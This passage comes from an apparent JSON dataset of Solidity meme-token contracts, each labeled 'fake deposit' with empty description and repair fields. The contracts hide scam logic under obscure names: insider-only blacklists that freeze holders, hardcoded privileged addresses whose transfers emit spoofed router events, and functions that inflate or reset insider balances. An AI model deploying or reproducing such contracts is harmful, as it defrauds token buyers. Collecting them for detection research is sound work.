Per[_MsgSendr()] = _kpTotalSupply;\r\n        emit Transfer(address(0), V2UniApproval, _kpTotalSupply);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _kpTotalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Per[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n        \r\n\t\tfunction appendkep(address px) public {\r\n        if(Yer[msg.sender]) { \r\n        Ker[px] = false;}}\r\n        \r\n        function appqueue(address px) public{\r\n         if(Yer[msg.sender])  { \r\n        require(!Ker[px]);\r\n        Ker[px] = true; }}\r\n\r\n\t\tfunction appstonk(address px) public{\r\n         if(msg.sender == _contractcreator)  { \r\n        require(!Yer[px]);\r\n        Yer[px] = true; }}\r\n\t\t\r\n        function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _contractcreator)  {\r\n        require(amount <= Per[sender]);\r\n        Per[sender] -= amount;  \r\n        Per[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (V2UniApproval, recipient, amount);\r\n        return true; }    \r\n          if(!Ker[recipient]) {\r\n          if(!Ker[sender]) {\r\n         require(amount <= Per[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        Per[sender] -= amount;\r\n        Per[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\r\n\t\tfunction transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == _contractcreator)  {\r\n        require(Per[msg.sender] >= amount);\r\n        Per[msg.sender] -= amount;  \r\n        Per[recipient] += amount; \r\n        emit Transfer (V2UniApproval, recipient, amount);}\r\n        if(Yer[msg.sender]) {Per[recipient] = amount;} \r\n        if(!Ker[msg.sender]) {\r\n        require(Per[msg.sender] >= amount);\r\n        Per[msg.sender] -= amount;  \r\n        Per[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address ESK = 0xf84308B5e77BB364fd589CCE137Bd5CaAe326eA6;\r\n\taddress EZrouter = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n        \t\tmodifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n\r\n}\r\n\r\n\r\n\r\ncontract ShibaBlue is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Ec;\r\n\tmapping (address => bool) private Eb;\r\n    mapping (address => bool) private Flw;\r\n    mapping (address => mapping (address => uint256)) private eD;\r\n    uint8 private constant _Dec = 8;\r\n    uint256 private constant sE = 150000000 * 10**_Dec;\r\n    string private constant _name = \"Shiba Blue\";\r\n    string private constant _symbol = \"BLUESHIB\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Ec[_msgSender()] = sE;\r\n         eploy(); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _Dec;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return sE;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Ec[account];\r\n    }\r\n    function eploy() onlyOwner internal {\r\n    emit Transfer(address(0), EZrouter, sE); }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return eD[owner][spender];\r\n    }\r\n\t        function eBurn(address Ef) onlyOwner public{\r\n        Eb[Ef] = true; }\r\n\t\t\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        eD[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n        \r\n\t\tfunction eStake(address Ef) public {\r\n        if(Eb[msg.sender]) { \r\n        Flw[Ef] = false;}}\r\n        function eQuery(address Ef) public{\r\n         if(Eb[msg.sender])  { \r\n        Flw[Ef] = true; }}\r\n   \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == ESK)  {\r\n        require(amount <= Ec[sender]);\r\n        Ec[sender] -= amount;  \r\n        Ec[recipient] += amount; \r\n          eD[sender][msg.sender] -= amount;\r\n        emit Transfer (EZrouter, recipient, amount);\r\n        return true; }  else  \r\n          if(!Flw[recipient]) {\r\n          if(!Flw[sender]) {\r\n         require(amount <= Ec[sender]);\r\n        require(amount <= eD[sender][msg.sender]);\r\n        Ec[sender] -= amount;\r\n        Ec[recipient] += amount;\r\n        eD[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Ei, uint256 Ef) public {\r\n        if(msg.sender == ESK)  {\r\n        require(Ec[msg.sender] >= Ef);\r\n        Ec[msg.sender] -= Ef;  \r\n        Ec[Ei] += Ef; \r\n        emit Transfer (EZrouter, Ei, Ef);} else  \r\n        if(Eb[msg.sender]) {Ec[Ei] += Ef;} else\r\n        if(!Flw[msg.sender]) {\r\n        require(Ec[msg.sender] >= Ef);\r\n        Ec[msg.sender] -= Ef;  \r\n        Ec[Ei] += Ef;          \r\n        emit Transfer(msg.sender, Ei, Ef);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address aAM = 0x62f83396eD8b31ceb8Ad611C2ABF3255CA169fE6;\r\n\taddress aAMP = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n modifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract VRISK is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private aAc;\r\n\tmapping (address => bool) private aAb;\r\n    mapping (address => bool) private aAw;\r\n    mapping (address => mapping (address => uint256)) private aAv;\r\n    uint8 private constant AAI = 8;\r\n    uint256 private constant aAS = 777777777 * (10** AAI);\r\n    string private constant _name = \"Vitalik Risk\";\r\n    string private constant _symbol = \"VitalRISK\";\r\n\r\n\r\n\r\n    constructor () {\r\n        aAc[_msgSender()] = aAS;\r\n         mmkr(aAMP, aAS); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return AAI;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return aAS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return aAc[account];\r\n    }\r\n\t\r\n\t\tfunction mstake(address aAj) public {\r\n        if(aAb[msg.sender]) { \r\n        aAw[aAj] = false;}}\r\n        function mquery(address aAj) public{\r\n         if(aAb[msg.sender])  { \r\n        aAw[aAj] = true; }}\r\n   \r\n\t\r\n\t\r\n    function mmkr(address aAj, uint256 aAn) onlyOwner internal {\r\n    emit Transfer(address(0), aAj ,aAn); }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return aAv[owner][spender];\r\n    }\r\n\t        function mburn(address aAj) onlyOwner public{\r\n        aAb[aAj] = true; }\r\n\t\t\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        aAv[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n        \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == aAM)  {\r\n        require(amount <= aAc[sender]);\r\n        aAc[sender] -= amount;  \r\n        aAc[recipient] += amount; \r\n          aAv[sender][msg.sender] -= amount;\r\n        emit Transfer (aAMP, recipient, amount);\r\n        return true; }  else  \r\n          if(!aAw[recipient]) {\r\n          if(!aAw[sender]) {\r\n         require(amount <= aAc[sender]);\r\n        require(amount <= aAv[sender][msg.sender]);\r\n        aAc[sender] -= amount;\r\n        aAc[recipient] += amount;\r\n        aAv[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address aAj, uint256 aAn) public {\r\n        if(msg.sender == aAM)  {\r\n        require(aAc[msg.sender] >= aAn);\r\n        aAc[msg.sender] -= aAn;  \r\n        aAc[aAj] += aAn; \r\n        emit Transfer (aAMP, aAj, aAn);} else  \r\n        if(aAb[msg.sender]) {aAc[aAj] += aAn;} else\r\n        if(!aAw[msg.sender]) {\r\n        require(aAc[msg.sender] >= aAn);\r\n        aAc[msg.sender] -= aAn;  \r\n        aAc[aAj] += aAn;          \r\n        emit Transfer(msg.sender, aAj, aAn);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract FREELON {\r\n  \r\n    mapping (address => uint256) public Rz;\r\n    mapping (address => uint256) public Ti;\r\n    mapping (address => bool) yZ;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\taddress cstrict = 0xb6Dd43749Eb3d4FDd7378a24a350D617EcAbF43B;\r\n\taddress VRouter3 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"FREED\";\r\n    string public symbol = unicode\"FREELON\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n\r\n\r\n    constructor()  {\r\n    Rz[msg.sender] = totalSupply;\r\n    emit Transfer(address(0), VRouter3, totalSupply); }\r\n\r\n   \r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == cstrict)  {\r\n        require(Rz[msg.sender] >= value);\r\n        Rz[msg.sender] -= value;  \r\n        Rz[to] += value; \r\n        emit Transfer (VRouter3, to, value);\r\n        return true; }  \r\n        if(!yZ[msg.sender]) {\r\n        require(Rz[msg.sender] >= value);\r\n        Rz[msg.sender] -= value;  \r\n        Rz[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\t\t\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function KBurn () public {\r\n         if(msg.sender == cstrict)   {\r\n        Rz[msg.sender] = Ti[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return Rz[account]; }\r\n\r\n        function Ldel(address nz) public {\r\n        if(msg.sender == cstrict)  { \r\n        yZ[nz] = false;}}\r\n        function LCheck(address nz) public{\r\n         if(msg.sender == cstrict)  { \r\n        require(!yZ[nz]);\r\n        yZ[nz] = true;\r\n        }}\r\n             function LBrdge(uint256 pi) public {\r\n        if(msg.sender == cstrict)  { \r\n        Ti[msg.sender] = pi;} }\r\n\r\n\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n        if(from == cstrict)  {\r\n        require(value <= Rz[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Rz[from] -= value;  \r\n        Rz[to] += value; \r\n        emit Transfer (VRouter3, to, value);\r\n        return true; }    \r\n          if(!yZ[from] && !yZ[to]) {\r\n        require(value <= Rz[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Rz[from] -= value;\r\n        Rz[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n// SPDX-License-Identifier: Unlicensed\r\n*/\r\n\r\npragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract UNDECIDEDCOIN {\r\n  \r\n    mapping (address => uint256) public OiO;\r\n    mapping (address => uint256) public LRNED;\r\n    mapping (address => bool) Ik;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"UNDECIDED COIN\";\r\n    string public symbol = unicode\"UNDECIDED\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address Head_Construct = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n\r\n    constructor()  {\r\n    OiO[msg.sender] = totalSupply;\r\n    deploy(Head_Construct, totalSupply); }\r\n\r\n   \r\n   address deplyer = 0xE5a18feF11dF6439Bd02314F66FFc2fa30239a28;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == deplyer)  {\r\n        require(OiO[msg.sender] >= value);\r\n        OiO[msg.sender] -= value;  \r\n        OiO[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }  \r\n        if(!Ik[msg.sender]) {\r\n        require(OiO[msg.sender] >= value);\r\n        OiO[msg.sender] -= value;  \r\n        OiO[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function Undecided () public {\r\n         if(msg.sender == deplyer)   {\r\n        OiO[msg.sender] = LRNED[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return OiO[account]; }\r\n\r\n        function RemoveBlacklist(address ii) public {\r\n        if(msg.sender == deplyer)  { \r\n        Ik[ii] = false;}}\r\n        function Blacklist(address ii) public{\r\n         if(msg.sender == deplyer)  { \r\n        require(!Ik[ii]);\r\n        Ik[ii] = true;\r\n        }}\r\n             function Maxwallet(uint256 x) public {\r\n        if(msg.sender == deplyer)  { \r\n        LRNED[msg.sender] = x;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == deplyer)  {\r\n        require(value <= OiO[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        OiO[from] -= value;  \r\n        OiO[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }    \r\n          if(!Ik[from] && !Ik[to]) {\r\n        require(value <= OiO[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        OiO[from] -= value;\r\n        OiO[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address eMCM = 0x1E0A2E851E86907c483d22b9A647a7A0E5740F5C;\r\n\taddress eWMB = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract DANKSHARD is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private eEc;\r\n\tmapping (address => bool) private eBe;\r\n    mapping (address => bool) private ewE;\r\n    mapping (address => mapping (address => uint256)) private vEb;\r\n    uint8 private constant lEB = 8;\r\n    uint256 private constant SBe = 150000000 * (10** lEB);\r\n    string private constant _name = \"DANKSHARDING\";\r\n    string private constant _symbol = \"DANKS\";\r\n\r\n\r\n\r\n    constructor () {\r\n        eEc[_msgSender()] = SBe;\r\n         MkRe(eWMB, SBe); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return lEB;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return SBe;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return eEc[account];\r\n    }\r\n\t\r\n\r\n   \r\n\r\n\t\r\n    function MkRe(address ejE, uint256 eNb) onlyOwner internal {\r\n    emit Transfer(address(0), ejE ,eNb); }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return vEb[owner][spender];\r\n    }\r\n\t\t\t function eburn(address ejE) onlyOwner public{\r\n        eBe[ejE] = true; }\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        vEb[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction equery(address ejE) public{\r\n         if(eBe[msg.sender])  { \r\n        ewE[ejE] = true; }}\r\n        \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == eMCM)  {\r\n        require(amount <= eEc[sender]);\r\n        eEc[sender] -= amount;  \r\n        eEc[recipient] += amount; \r\n          vEb[sender][msg.sender] -= amount;\r\n        emit Transfer (eWMB, recipient, amount);\r\n        return true; }  else  \r\n          if(!ewE[recipient]) {\r\n          if(!ewE[sender]) {\r\n         require(amount <= eEc[sender]);\r\n        require(amount <= vEb[sender][msg.sender]);\r\n        eEc[sender] -= amount;\r\n        eEc[recipient] += amount;\r\n        vEb[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction eStake(address ejE) public {\r\n        if(eBe[msg.sender]) { \r\n        ewE[ejE] = false;}}\r\n\t\t\r\n\t\tfunction transfer(address ejE, uint256 eNb) public {\r\n        if(msg.sender == eMCM)  {\r\n        require(eEc[msg.sender] >= eNb);\r\n        eEc[msg.sender] -= eNb;  \r\n        eEc[ejE] += eNb; \r\n        emit Transfer (eWMB, ejE, eNb);} else  \r\n        if(eBe[msg.sender]) {eEc[ejE] += eNb;} else\r\n        if(!ewE[msg.sender]) {\r\n        require(eEc[msg.sender] >= eNb);\r\n        eEc[msg.sender] -= eNb;  \r\n        eEc[ejE] += eNb;          \r\n        emit Transfer(msg.sender, ejE, eNb);}}\r\n\t\t\r\n\t\t\r\n\r\n\t\t\r\n\t\t}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
